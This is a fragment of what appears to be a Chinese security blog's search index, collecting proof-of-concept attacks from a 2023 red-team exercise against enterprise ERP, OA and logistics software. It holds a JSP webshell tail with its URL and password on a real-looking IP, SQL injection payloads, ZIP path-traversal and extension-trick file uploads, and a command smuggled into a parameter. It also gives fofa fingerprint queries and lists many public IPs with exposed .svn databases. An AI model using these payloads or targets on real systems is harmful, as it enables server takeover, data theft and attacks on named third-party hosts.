c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u003e WebShell URL: https://106.14.45.41:8102/form/temp/202308110mil4t7y6wdq7eu6_C4fD6D7DCb9B199a.jsp Password: rebeyond WebShell tool: Behinder v3.0 Webshell type: jsp ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 formservice 文件上传漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-formservice-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"企业流程化管控系统\" \u0026\u0026 body=\"密码(Password):\" ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-login-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 login 文件读取漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-login-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /login HTTP/1.1 Host: 111.39.94.182:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Connection: close Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 Accept-Encoding: gzip Content-Length: 111 op=verify%7Clogin\u0026targetpage=\u0026errorpage=WEB-INF/classes/proxool.xml\u0026mark=\u0026tzo=480\u0026username=admin\u0026password=admin ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-login-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 login 文件读取漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-login-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"企业流程化管控系统\" \u0026\u0026 body=\"密码(Password):\" ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-wc.db-%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 wc.db 文件信息泄露漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-wc.db-%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://1.85.4.126:8090/.svn/wc.db http://106.14.45.41:8088/.svn/wc.db https://106.14.45.41:8102/.svn/wc.db http://111.164.90.142:8501/.svn/wc.db http://111.164.90.142:8081/.svn/wc.db http://111.198.51.59:8088/.svn/wc.db http://111.198.51.59:8081/.svn/wc.db http://111.39.94.182:8081/.svn/wc.db ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-wc.db-%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统 wc.db 文件信息泄露漏洞","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F-wc.db-%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"企业流程化管控系统\" \u0026\u0026 body=\"密码(Password):\" ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9Fsession%E6%B3%84%E9%9C%B2/:0:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统session泄露","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9Fsession%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw"],"content":"poc http://61.183.190.138:85/manage/index.jsp ","date":"2023-12-08","objectID":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9Fsession%E6%B3%84%E9%9C%B2/:1:0","tags":["2023hw"],"title":"时空智友企业流程化管控系统session泄露","uri":"/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9Fsession%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"昂捷ERP-WebService接口-SQL注入漏洞(QVD-2023-45071) 昂捷ERP WebService接口 存在SQL注入漏洞，未经身份验证的攻击者可以利用该漏洞泄露系统敏感信息。 ","date":"2023-12-08","objectID":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/:1:0","tags":["2023hw漏洞"],"title":"昂捷ERP WebService接口 SQL注入漏洞(QVD-2023-45071)","uri":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/"},{"categories":["2023hw漏洞"],"content":"fofa body=\"CheckSilverlightInstalled\" ","date":"2023-12-08","objectID":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/:2:0","tags":["2023hw漏洞"],"title":"昂捷ERP WebService接口 SQL注入漏洞(QVD-2023-45071)","uri":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/"},{"categories":["2023hw漏洞"],"content":"hunter web.body=\"CheckSilverlightInstalled\" ","date":"2023-12-08","objectID":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/:3:0","tags":["2023hw漏洞"],"title":"昂捷ERP WebService接口 SQL注入漏洞(QVD-2023-45071)","uri":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/"},{"categories":["2023hw漏洞"],"content":"SQL注入点1 /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1 Host: xxx.xxx.xxx.xxx:8008 Content-Type: text/xml; charset=utf-8 Content-Length: 482 SOAPAction: \"http://tempuri.org/GetOSpById\" \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\u003csoap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoap:Body\u003e\u003cGetOSpById xmlns=\"http://tempuri.org/\"\u003e\u003csId\u003estring' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj\u003c/sId\u003e\u003c/GetOSpById\u003e\u003c/soap:Body\u003e\u003c/soap:Envelope\u003e ","date":"2023-12-08","objectID":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/:4:0","tags":["2023hw漏洞"],"title":"昂捷ERP WebService接口 SQL注入漏洞(QVD-2023-45071)","uri":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/"},{"categories":["2023hw漏洞"],"content":"SQL注入点2 /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1 Host: xxx.xxx.xxx.xxx:8008 Content-Type: text/xml; charset=utf-8 Content-Length: 482 SOAPAction: \"http://tempuri.org/GetOSpById\" \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\u003csoap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoap:Body\u003e\u003cGetOSpById xmlns=\"http://tempuri.org/\"\u003e\u003csId\u003estring' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj\u003c/sId\u003e\u003c/GetOSpById\u003e\u003c/soap:Body\u003e\u003c/soap:Envelope\u003e ","date":"2023-12-08","objectID":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/:5:0","tags":["2023hw漏洞"],"title":"昂捷ERP WebService接口 SQL注入漏洞(QVD-2023-45071)","uri":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 访问漏洞点存在的地址 http://xxx.xxx.xxx.xxx:9012/EnjoyRMIS_WS/WS/Hr/CWSHr.asmx 在地址后面加上?wsdl http://xxx.xxx.xxx.xxx:8123/EnjoyRMIS_WS/WS/Hr/CWSHr.asmx?wsdl 使用wsdler拓展工具解析 解析完成之后，即可对这些接口进行测试 ","date":"2023-12-08","objectID":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/:6:0","tags":["2023hw漏洞"],"title":"昂捷ERP WebService接口 SQL注入漏洞(QVD-2023-45071)","uri":"/%E6%98%82%E6%8D%B7erp-webservice%E6%8E%A5%E5%8F%A3-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Eqvd-2023-45071/"},{"categories":["2023hw"],"content":"```\r/cqztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1 ","date":"2023-12-08","objectID":"/%E6%98%8E%E5%BE%A1sql%E6%B3%A8%E5%85%A5/:0:0","tags":["2023hw"],"title":"明御sql注入","uri":"/%E6%98%8E%E5%BE%A1sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"明源云 ERP ApiUpdate.ashx 文件上传漏洞 POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1 Host: target.com Accept-Encoding: gzip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 856 {{unquote(\"PK\\x03\\x04\\x14\\x00\\x00\\x00\\x08\\x00\\xf2\\x9a\\x0bW\\x97\\xe9\\x8br\\x8c\\x00\\x00\\x00\\x93\\x00\\x00\\x00\\x1e\\x00\\x00\\x00../../../fdccloud/_/check.aspx$\\xcc\\xcb\\x0a\\xc20\\x14\\x04\\xd0_\\x09\\x91B\\xbb\\x09\\x0a\\xddH\\xab\\x29\\x8aP\\xf0QZ\\xc4\\xf5m\\x18j!ib\\x1e\\x82\\x7fo\\xc4\\xdd0g\\x98:\\xdb\\xb1\\x96F\\xb03\\xcdcLa\\xc3\\x0f\\x0b\\xce\\xb2m\\x9d\\xa0\\xd1\\xd6\\xb8\\xc0\\xae\\xa4\\xe1-\\xc9d\\xfd\\xc7\\x07h\\xd1\\xdc\\xfe\\x13\\xd6%0\\xb3\\x87x\\xb8\\x28\\xe7R\\x96\\xcbr5\\xacyQ\\x9d\u0026\\x05q\\x84B\\xea\\x7b\\xb87\\x9c\\xb8\\x90m\\x28\u003c\\xf3\\x0e\\xaf\\x08\\x1f\\xc4\\xdd\\x28\\xb1\\x1f\\xbcQ1\\xe0\\x07EQ\\xa5\\xdb/\\x00\\x00\\x00\\xff\\xff\\x03\\x00PK\\x01\\x02\\x14\\x03\\x14\\x00\\x00\\x00\\x08\\x00\\xf2\\x9a\\x0bW\\x97\\xe9\\x8br\\x8c\\x00\\x00\\x00\\x93\\x00\\x00\\x00\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00../../../fdccloud/_/check.aspxPK\\x05\\x06\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00L\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\")}} vsoft=kvm\u0026hostType=physical\u0026name=penson\u0026extranet=127.0.0.1%7Ccalc.exe\u0026cpuCores=2\u0026 memory=16\u0026diskSize=16\u0026desc=\u0026uid=640be59da4851\u0026type=za ","date":"2023-12-08","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp-apiupdate.ashx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"明源云 ERP ApiUpdate.ashx 文件上传漏洞","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp-apiupdate.ashx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"明源采招系统-系统版本\"ERP25X\"\r/CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName\u0026ParentCode=1'+union+select+current_user-- ","date":"2023-12-08","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp-visitorweb_xmlhttp.aspx-sql%E6%B3%A8%E5%85%A5/:0:0","tags":["2023hw"],"title":"明源云 erp VisitorWeb_xmlHTTP.aspx sql注入","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp-visitorweb_xmlhttp.aspx-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"# 明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞\rhttps://jdr2021.github.io/2023/08/16/%E6%98%8E%E6%BA%90%E4%BA%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0 ","date":"2023-12-08","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 明源云 ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞，攻击者通过构造特殊的ZIP压缩包可以上传任意文件，控制服务器 ","date":"2023-12-08","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 明源云 ERP系统接口管家 ","date":"2023-12-08","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 “接口管家站点正常！\" ","date":"2023-12-08","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登录页面 漏洞存在于某端口下的接口管家服务 验证POC POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1 Host: Accept-Encoding: gzip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 856 {{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}} /fdccloud/_/test.aspx ","date":"2023-12-08","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"易宝OA ExecuteSqlForSingle SQL注入漏洞 ","date":"2023-12-08","objectID":"/%E6%98%93%E5%AE%9Doa-executesqlforsingle-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"易宝OA ExecuteSqlForSingle SQL注入漏洞","uri":"/%E6%98%93%E5%AE%9Doa-executesqlforsingle-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa \"顶讯科技\" ","date":"2023-12-08","objectID":"/%E6%98%93%E5%AE%9Doa-executesqlforsingle-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"易宝OA ExecuteSqlForSingle SQL注入漏洞","uri":"/%E6%98%93%E5%AE%9Doa-executesqlforsingle-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /api/system/ExecuteSqlForSingle HTTP/1.1 Host: IP:PORT Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Content-Length: 103 token=zxh\u0026sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)\u0026strParameters 发送poc 在返回包中存在 e10adc3949ba59abbe56e057f20f883e 字符为存在漏洞 ","date":"2023-12-08","objectID":"/%E6%98%93%E5%AE%9Doa-executesqlforsingle-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"易宝OA ExecuteSqlForSingle SQL注入漏洞","uri":"/%E6%98%93%E5%AE%9Doa-executesqlforsingle-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"易思智能物流无人值守系统5.0存在任意文件上传漏洞 ","date":"2023-12-08","objectID":"/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F5.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"易思智能物流无人值守系统5.0存在任意文件上传漏洞","uri":"/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F5.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa \"智能物流无人值守系统\" ","date":"2023-12-08","objectID":"/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F5.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"易思智能物流无人值守系统5.0存在任意文件上传漏洞","uri":"/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F5.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp POST /Sys_ReportFile/ImportReport?encode=717132 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 199 Content-Type: multipart/form-data; boundary=59d3d0b126080d21572c9e7a77d89931 --59d3d0b126080d21572c9e7a77d89931 Content-Disposition: form-data; name=\"file\"; filename=\"1234.grf;.aspx\" Content-Type: application/octet-stream 304674859 --59d3d0b126080d21572c9e7a77d89931-- 上传成功后，会返回路径 http://127.0.0.1/GRF/Custom/717132.aspx ","date":"2023-12-08","objectID":"/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F5.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"易思智能物流无人值守系统5.0存在任意文件上传漏洞","uri":"/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F5.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\ricon_hash=\"2007842404\" ","date":"2023-12-08","objectID":"/%E6%98%93%E6%80%9D%E8%BD%AF%E4%BB%B6-%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F-importreport-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"易思软件-智能物流无人值守系统 ImportReport 任意文件上传","uri":"/%E6%98%93%E6%80%9D%E8%BD%AF%E4%BB%B6-%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F-importreport-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"poc http://111.59.196.173:8001//GRF/Custom/health.aspx POST /Sys_ReportFile/ImportReport?encode=health HTTP/1.1 Host: 111.59.196.173:8001 Content-Length: 203 X-File-Name: cves.grf User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 